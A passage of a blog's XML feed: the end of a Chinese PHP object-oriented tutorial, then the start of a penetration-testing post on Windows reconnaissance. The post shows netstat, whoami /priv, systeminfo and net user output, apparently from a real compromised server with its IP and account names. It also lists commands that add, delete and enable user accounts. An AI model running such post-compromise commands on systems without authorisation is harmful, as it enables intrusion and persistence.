<span class="keyword">echo</span> <span class="string">&quot;名字为<span class="subst">&#123;$name&#125;</span>,年龄为<span class="subst">&#123;$age&#125;</span>。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$student1=<span class="keyword">new</span> Student;</span><br><span class="line">$student1-&gt;echo_info(<span class="number">12</span>,<span class="string">&#x27;steady&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="伪变量-this的使用"><a href="#伪变量-this的使用" class="headerlink" title="伪变量$this的使用"></a>伪变量$this的使用</h3><h4 id="伪变量-this的含义"><a href="#伪变量-this的含义" class="headerlink" title="伪变量$this的含义"></a>伪变量$this的含义</h4><p>在PHP中，使用$this变量来代替当前对象，例如：$this-&gt;name = ‘张三’</p><p>$this代表当前对象，是到当前对象的一个引用；</p><p>$this更像是一个对象指针，指向当前对象；</p><p>$this只能用在对象方法定义中，去调用对象的成员属性或成员方法。</p><p>只有创建对象后，$this变量才存在。类不会自动运行。</p><h4 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="comment">//私有的成员属性：类外无法访问</span></span><br><span class="line"><span class="keyword">private</span> $name = <span class="string">&quot;张三丰&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> $age  = <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//受保护的成员方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showLine</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//公共的成员(对象)方法</span></span><br><span class="line"><span class="comment">//$this变量只能在成员方法中使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//在成员方法中，使用$this变量代替传递进来的$obj对象</span></span><br><span class="line"><span class="comment">//$this和$obj指向的是同一个对象</span></span><br><span class="line">$str = <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$this-&gt;name&#125;</span>的基本信息&lt;/h2&gt;&quot;</span>;</span><br><span class="line">$str .= <span class="keyword">$this</span>-&gt;showLine();</span><br><span class="line">$str .= <span class="string">&quot;<span class="subst">&#123;$this-&gt;name&#125;</span>的年龄是<span class="subst">&#123;$this-&gt;age&#125;</span>岁！&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类的对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="comment">//调用对象的方法</span></span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="类常量的定义"><a href="#类常量的定义" class="headerlink" title="类常量的定义"></a>类常量的定义</h3><h4 id="类常量介绍"><a href="#类常量介绍" class="headerlink" title="类常量介绍"></a>类常量介绍</h4><p>可以把在类中始终保持不变的值定义为常量，例如：圆周率、班级名称等。</p><p>常量的值必须是一个定值，不能修改，也不能删除；</p><p>类常量就是类的常量，是与类相关的，与对象无关。</p><p>类常量在内存中只有一份，不管创建多少个对象。</p><p>类常量可以极大节省服务器内存，可以被所有对象去共享。</p><h4 id="类常量定义和调用格式"><a href="#类常量定义和调用格式" class="headerlink" title="类常量定义和调用格式"></a>类常量定义和调用格式</h4><p>类常量没有权限，只有属性和方法才会有权限。</p><p>使用const来定义类的常量(局部常量)，只能在局部作用域下使用；define()定义常量是全局常量，在任何地方都可以使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="comment">//声明类常量</span></span><br><span class="line"><span class="keyword">const</span> DB_HOST = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> DB_USER = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> DB_PASS = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的成员方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$str = <span class="string">&quot;&lt;h2&gt;在类内访问类常量&lt;/h2&gt;&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;主机名：&quot;</span>.Student::DB_HOST;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;用户名：&quot;</span>.Student::DB_USER;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;密码：&quot;</span>.Student::DB_PASS;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用静态化方式，直接访问类常量，不需要创建对象</span></span><br><span class="line">$str = <span class="string">&quot;&lt;h2&gt;在类外访问类常量&lt;/h2&gt;&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;主机名：&quot;</span>.Student::DB_HOST;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;用户名：&quot;</span>.Student::DB_USER;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;密码：&quot;</span>.Student::DB_PASS;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><h4 id="什么是构造方法"><a href="#什么是构造方法" class="headerlink" title="什么是构造方法"></a>什么是构造方法</h4><p>当使用new关键字创建对象时，第1个自动调用的方法，就是构造方法；</p><p>构造方法的名称是固定的：<code>void __construct ([ mixed $args [, $... ]] )</code></p><p>构造方法可以带参数，也可以不带参数；构造方法不是必须的，是可选的；</p><p>构造方法的作用：对象初始化。例如：给对象属性赋值、数据库对象初始化(连接、选择数据库</p><p>构造方法一定是成员方法。构造方法的权限可以自己指定。</p><p>构造方法一般不需要主动调用，都是自动调用的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="comment">//私有的成员属性：在项目中，成员属性没有具体的数据，可以有默认值</span></span><br><span class="line"><span class="comment">//所有数据都来自外部传递，所有属性一般都是私有的</span></span><br><span class="line"><span class="keyword">private</span> $name;</span><br><span class="line"><span class="keyword">private</span> $sex;</span><br><span class="line"><span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name2,$sex2,$age2</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = $name2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sex  = $sex2;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age  = $age2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的自我显示的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$str = <span class="string">&quot;姓名：<span class="subst">&#123;$this-&gt;name&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;性别：<span class="subst">&#123;$this-&gt;sex&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;年龄：<span class="subst">&#123;$this-&gt;age&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类的对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student(<span class="string">&quot;张三四&quot;</span>,<span class="string">&quot;男&quot;</span>,<span class="number">26</span>);</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h3><h4 id="什么是析构方法"><a href="#什么是析构方法" class="headerlink" title="什么是析构方法"></a>什么是析构方法</h4><p>对象销毁前自动调用的方法，就是析构方法； </p><p>析构方法的名称是固定的：<code>void __destruct ( void )</code></p><p>析构方法不带任何参数；</p><p>析构方法一定是成员方法。</p><p>析构方法的作用：垃圾回收工作，例如：断开到MySQL的连接</p><h4 id="对象何时销毁"><a href="#对象何时销毁" class="headerlink" title="对象何时销毁"></a>对象何时销毁</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;对象即将销毁&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$student1=<span class="keyword">new</span> Student();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;steady&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP核心编程5&quot;&gt;&lt;a href=&quot;#PHP核心编程5&quot; class=&quot;headerlink&quot; title=&quot;PHP核心编程5&quot;&gt;&lt;/a&gt;PHP核心编程5&lt;/h1&gt;&lt;h2 id=&quot;类的定义&quot;&gt;&lt;a href=&quot;#类的定义&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--windows系统信息收集与提权-(2)</title>
    <link href="http://s1eady.top/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(2)/"/>
    <id>http://s1eady.top/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(2)/</id>
    <published>2019-12-11T21:33:56.000Z</published>
    <updated>2020-11-23T03:58:37.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用信息收集命令"><a href="#常用信息收集命令" class="headerlink" title="常用信息收集命令"></a>常用信息收集命令</h2><h4 id="netstat-ano"><a href="#netstat-ano" class="headerlink" title="netstat -ano"></a>netstat -ano</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613165717647.png" alt="image-20200613165717647"></p><p>解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">協定     本機位址                外部位址                狀態            PID</span><br><span class="line">Proto   Local Address          Foreign Address        State</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1964</span><br><span class="line">  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:82             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:83             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:84             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:85             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    210.65.11.201:50913    111.221.29.254:443     TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50918    40.90.22.187:443       ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50919    117.18.237.29:80       ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50920    52.139.153.205:443     ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50921    52.229.171.202:443     TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50922    40.91.91.94:443        TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50923    111.221.29.254:443     ESTABLISHED     1908</span><br><span class="line">  TCP    210.65.11.201:50924    210.65.144.217:80      TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50925    20.189.73.166:443      TIME_WAIT       0</span><br><span class="line">  TCP    210.65.11.201:50926    111.221.29.254:443     ESTABLISHED     1908</span><br><span class="line">  TCP    210.65.11.201:50930    210.65.144.232:80      ESTABLISHED     392</span><br><span class="line">  TCP    210.65.11.201:50931    111.221.29.254:443     ESTABLISHED     1908</span><br><span class="line">  TCP    210.65.11.201:50932    52.163.83.146:443      ESTABLISHED     8832</span><br><span class="line">  TCP    [::]:80                [::]:0                 LISTENING       1964</span><br><span class="line">  UDP    127.0.0.1:1900         *:*    4732</span><br><span class="line">  UDP    127.0.0.1:56122        *:*    392</span><br><span class="line">  UDP    127.0.0.1:61790        *:*    4732</span><br><span class="line">  UDP    [::]:123               *:*    360</span><br><span class="line">  UDP    [::]:500               *:*    392</span><br><span class="line">  UDP    [::]:3389              *:*    848</span><br><span class="line">  UDP    [::]:4500              *:*    392</span><br><span class="line">  UDP    [::]:5353              *:*    1064</span><br></pre></td></tr></table></figure><ul><li><p>协议（Proto ）：TCP ，指是传输层通讯协议</p></li><li><p>本地机器名（Local Address ）和端口：0.0.0.0:80</p></li><li><p>远程机器名（Foreign Address ）和端口：52.163.83.146:443</p></li><li><p>状态列表：</p><p>LISTEN  ：在监听状态中。<br>ESTABLISHED ：已建立联机的联机情况。<br>TIME_WAIT ：该联机在目前已经是等待的状态。 </p></li></ul><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li><p>小于1024 的端口通常运行一些网络服务，大于1024 的端口用来与远程机器建立连接。</p></li><li><p>0.0.0.0 是对外开放，通过服务域名、ip可以访问的端口</p></li><li><p>127.0.0.1 只能对本机 localhost访问，也是保护此端口安全性</p></li><li><p>::: 这三个: 的前两个”::”，是“0:0:0:0:0:0:0:0”的缩写，相当于IPv6的”0.0.0.0”，就是本机的所有<a href="https://www.baidu.com/s?wd=IPv6%E5%9C%B0%E5%9D%80&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YdP16zuynsnHw9Pjczmyfv0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EPHmsnjmvP1cY">IPv6地址</a>，第三个:是IP和端口的分隔符</p></li></ul><h4 id="whoami-PRIV"><a href="#whoami-PRIV" class="headerlink" title="whoami  /PRIV"></a>whoami  /PRIV</h4><p>whoami  /PRIV命令可以查看用户的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; whoami &#x2F;priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">特殊权限名称                  描述                   状况  </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAuditPrivilege              产生安全稽核           已停用</span><br><span class="line">SeIncreaseQuotaPrivilege      调整处理程序记忆体配额 已停用</span><br><span class="line">SeAssignPrimaryTokenPrivilege 更换处理层权杖         已停用</span><br><span class="line">SeChangeNotifyPrivilege       略过周游检查           已启用</span><br><span class="line">SeImpersonatePrivilege        验证后模拟用户端       已启用</span><br><span class="line">SeCreateGlobalPrivilege       建立全域物件           已启用</span><br></pre></td></tr></table></figure><h4 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net user [ username [password | * ] [ option ] ] [ &#x2F;domain ]</span><br><span class="line"></span><br><span class="line">net user administrator显示administrator用户的信息</span><br><span class="line"></span><br><span class="line">net user test 123 &#x2F;add  添加一个名为test、密码为123的用户帐户（密码可省略）</span><br><span class="line"></span><br><span class="line">net user test abc将test用户的密码更改为abc</span><br><span class="line"></span><br><span class="line">net user test &#x2F;del将test用户删除</span><br><span class="line"> </span><br><span class="line">net user test &#x2F;active:no 将test用户禁用</span><br></pre></td></tr></table></figure><ul><li><p>输入不带参数的net user 查看计算机上的用户账号列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net user</span><br><span class="line">\\ 的使用者帳戶</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest                    </span><br><span class="line">test                     WDeployAdmin             WDeployConfigWriter  </span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            </span><br><span class="line">banli                    </span><br><span class="line">fa080                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Guest                    </span><br><span class="line">kaichu                   </span><br><span class="line">LUXIAOYU                 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ooo                      </span><br><span class="line">steady       </span><br></pre></td></tr></table></figure></li><li><p>删除用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net user steady &#x2F;del</span><br><span class="line">Administrator            </span><br><span class="line">banli                    </span><br><span class="line">fa080                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Guest                    </span><br><span class="line">kaichu                   </span><br><span class="line">LUXIAOYU                 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ooo                      </span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>显示管理员组中的所有成员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>查看用户Administrator的信息</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net user Administrator</span><br><span class="line">使用者名稱             Administrator</span><br><span class="line">全名                   </span><br><span class="line">註解                   管理電腦/網域的內建帳戶</span><br><span class="line">使用者的註解           </span><br><span class="line">國家/區域碼            <span class="number">000</span> (系統預設值)</span><br><span class="line">帳戶使用中             Yes</span><br><span class="line">帳戶到期               從不</span><br><span class="line">上次設定密碼           <span class="number">2019</span>/<span class="number">5</span>/<span class="number">22</span> 下午 <span class="number">09</span>:<span class="number">17</span>:<span class="number">02</span></span><br><span class="line">密碼到期               <span class="number">2019</span>/<span class="number">7</span>/<span class="number">3</span> 下午 <span class="number">09</span>:<span class="number">17</span>:<span class="number">02</span></span><br><span class="line">可變更密碼             <span class="number">2019</span>/<span class="number">5</span>/<span class="number">22</span> 下午 <span class="number">09</span>:<span class="number">17</span>:<span class="number">02</span></span><br><span class="line">請輸入密碼             Yes</span><br><span class="line">使用者可以變更密碼     Yes</span><br><span class="line">容許的工作站           全部</span><br><span class="line">登入指令檔             </span><br><span class="line">使用者設定檔           </span><br><span class="line">主目錄                 </span><br><span class="line">上次登入時間           <span class="number">2020</span>/<span class="number">6</span>/<span class="number">12</span> 下午 <span class="number">09</span>:<span class="number">00</span>:<span class="number">01</span></span><br><span class="line">可容許的登入時數       全部</span><br><span class="line">本機群組會員           *Administrators       </span><br><span class="line">全域群組會員           *None                 </span><br><span class="line">命令已經成功完成。</span><br></pre></td></tr></table></figure></li><li><p>激活用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user guest &#x2F;active:yes 激活guest用户</span><br></pre></td></tr></table></figure></li></ul><h4 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h4><p>查看操作系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; systeminfo</span><br></pre></td></tr></table></figure><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; systeminfo</span><br><span class="line">主機名稱:             BV550191590002</span><br><span class="line">作業系統名稱:         Microsoft Windows Server <span class="number">2016</span> Datacenter</span><br><span class="line">作業系統版本:         <span class="number">10.0</span><span class="number">.14393</span> N/A 組建 <span class="number">14393</span></span><br><span class="line">作業系統製造商:       Microsoft Corporation</span><br><span class="line">作業系統設定:         獨立伺服器</span><br><span class="line">作業系統組建類型:     Multiprocessor Free</span><br><span class="line">註冊的擁有者:         BV550191590002</span><br><span class="line">註冊公司:             chttl</span><br><span class="line">產品識別碼:           <span class="number">00376</span><span class="number">-40000</span><span class="number">-00000</span>-AA947</span><br><span class="line">原始安裝日期:         <span class="number">2019</span>/<span class="number">2</span>/<span class="number">12</span>, 下午 <span class="number">02</span>:<span class="number">57</span>:<span class="number">55</span></span><br><span class="line">系統開機時間:         <span class="number">2020</span>/<span class="number">6</span>/<span class="number">10</span>, 下午 <span class="number">05</span>:<span class="number">43</span>:<span class="number">40</span></span><br><span class="line">系統製造商:           VMware, Inc.</span><br><span class="line">系統型號:             VMware Virtual Platform</span><br><span class="line">系統類型:             x64-based PC</span><br><span class="line">處理器:               已安裝 <span class="number">2</span> 處理器。</span><br><span class="line">                      [<span class="meta">01</span>]: Intel64 Family <span class="number">6</span> Model <span class="number">37</span> Stepping <span class="number">1</span> GenuineIntel ~<span class="number">2400</span> Mhz</span><br><span class="line">                      [<span class="meta">02</span>]: Intel64 Family <span class="number">6</span> Model <span class="number">37</span> Stepping <span class="number">1</span> GenuineIntel ~<span class="number">2400</span> Mhz</span><br><span class="line">BIOS 版本:            Phoenix Technologies LTD <span class="number">6.00</span>, <span class="number">2015</span>/<span class="number">9</span>/<span class="number">17</span></span><br><span class="line">Windows 目錄:         